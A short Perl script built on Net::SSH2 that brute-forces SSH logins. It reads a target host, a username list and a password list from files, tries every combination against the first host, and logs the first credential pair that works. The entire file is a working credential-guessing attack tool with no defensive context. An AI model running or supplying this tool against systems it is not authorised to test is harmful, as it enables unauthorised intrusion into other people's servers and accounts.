#!perl
use Data::Dumper;
use strict();
use Net::SSH2;

unless ( @ARGV ) { print q[Error: argument list is empty], "\n"; exit(0); };

my ( @target, @users, @passw, $cnt, );

@target	= &getinput( $ARGV[0] ) if ( $ARGV[0] );
my $outfile = $ARGV[1];
@users	= &getinput( $ARGV[2] ) if ( $ARGV[2] );
@passw	= &getinput( $ARGV[3] ) if ( $ARGV[3] );

# die Dumper ( $target, $users, $passw );

open(OUTFILE, ">>$outfile");

my $ssh2 = Net::SSH2->new();

 if ( $ssh2->connect( $target[0] ) ) {

  map {

	  my $user = $_;
	  map {

		  my $try = $_;

		  $ssh2->auth_password( $user, $try );
		  my $ok = $ssh2->auth_ok();

		  if( $ok ) {

			print OUTFILE qq[pair $user:$try is good \@$target[0]\n];
            close(OUTFILE);
			exit(0);

		  }

		  $cnt++;
		  sleep(1);

	  } @passw;

  } @users;

  print OUTFILE qq[tried $cnt user:pass combinations on $target[0], none succeeded...\n];

}
else { print OUTFILE qq[Error: failed to connect to $target[0]\n]; }
close(OUTFILE);
exit(0);

sub getinput {

  my $fi = shift;

  if ( open( IN, '<:utf8', $fi ) ) {

	my @fo;

	while( <IN> ){ chomp; push @fo, $_; }

	close( IN );

	return @fo;# if ( scalar @fo > 1 );
	#return $fo[0];

  }
  else { print q[Error: cannot open file ], $fi, "\n"; exit(0); }

};
